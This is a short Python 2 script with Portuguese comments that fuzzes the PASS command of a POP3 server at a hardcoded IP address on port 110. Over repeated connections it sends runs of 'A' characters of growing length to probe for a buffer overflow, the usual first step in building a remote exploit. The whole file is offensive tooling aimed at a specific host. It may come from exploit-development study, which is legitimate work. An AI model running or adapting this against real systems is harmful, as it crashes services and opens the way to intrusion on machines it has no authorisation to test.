#/usr/bin/python
import socket
#Gera lista incremental de caracteres
buffer=["A"]
contador=100
while len(buffer) <= 30:
    buffer.append("A"*contador)
    contador=contador+200

for string in buffer:
    print "Fuzzinf em PASS com %s bytes" %len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("195.177.177.17",110))
    r = s.recv(1024)
    print r

    s.send("USER admin\r\n")
    r = s.recv(1024)
    print r
    s.send('PASS '+string+'\r\n')
    r = s.recv(1024)
    print r

    s.send("QUIT\r\n")
    r = s.recv(1024)
    print r

